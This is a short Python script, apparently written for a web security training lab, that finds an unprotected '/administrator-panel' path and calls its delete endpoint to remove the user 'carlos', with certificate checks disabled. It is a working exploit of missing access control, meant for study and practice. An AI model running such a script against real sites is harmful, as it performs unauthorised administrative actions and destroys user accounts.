import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxie={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

def delete_user(url):
    adminP_url=url + "/administrator-panel"
    r=requests.get(adminP_url,verify=False)
    if r.status_code == 200:
        
        print("(+) admin pane founded .")
        print("(+) deleting user carlos ....")
        delete_user_carlos_url=adminP_url +'/delete?username=carlos'
        r=requests.get(delete_user_carlos_url,verify=False)
        if r.status_code == 200:
            print('(+) carlos user deleted ')
            print("(+) Congratulations, you solved the lab!")



        else:
            print("(-) Cloud not deleted user")
    else:
        print("(-) admin panle could not  found ")
        print('(-) exiting the script ')

def main():
    if len(sys.argv) !=2:
        print("(+) usage %s <url> " %sys.argv[0])
        print("(+) Example %s www.example.com" %sys.argv[0])
        sys.exit(-1)
    url=sys.argv[1]
    print("[+] Finding admin panel ")
    delete_user(url)
    

if __name__=="__main__":
    main()
